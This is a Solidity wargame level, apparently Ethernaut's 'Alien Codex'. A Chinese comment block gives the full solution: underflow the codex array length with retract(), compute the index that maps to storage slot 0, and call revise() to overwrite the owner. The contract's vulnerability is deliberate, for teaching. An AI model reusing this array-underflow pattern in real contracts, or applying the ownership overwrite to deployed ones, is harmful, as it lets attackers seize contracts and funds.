// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/ownership/Ownable.sol";

/*
 * 你打开了一个 Alien 合约. 申明所有权来完成这一关.
 *
 * 1.由于 EVM 存储优化的关系，在 slot [0]中同时存储了contact和owner，需要做的就是将owner变量覆盖为自己。
 * 2.首先通过 make_contact() 函数，我们可以将contact变量设置为 true
 * 3.之后就是一个OOB (out of boundary) Attack
 * 4.在Solidity中动态数组内变量的存储位计算方法可以概括为：b[X] == SLOAD(keccak256(slot) + X)
 * 5.在本题中，数组 codex 的 slot 为 1，同时也是存储数组长度的地方，调用 retract()，使得 codex 数组长度下溢，变为0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff (2**256)
 * 6.计算数组下标对应slot
 *   sha3.keccak_256(bytes32(1)).hexdigest() = 'b10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'
 *   2**256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
 *   35707666377435648211887908874984608119992236509074197713628505308453184860938
 * 7.codex[35707666377435648211887908874984608119992236509074197713628505308453184860938] 对应的存储位就是 slot 0。
 *   之前提到 slot 0 中同时存储了 contact 和 owner，只需将 owner 替换为 player 地址即可
 * 8.contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x0000000000000000000000015Bc4d6760C24Eb7939d3D28A380ADd2EAfFc55d5')
 */
contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}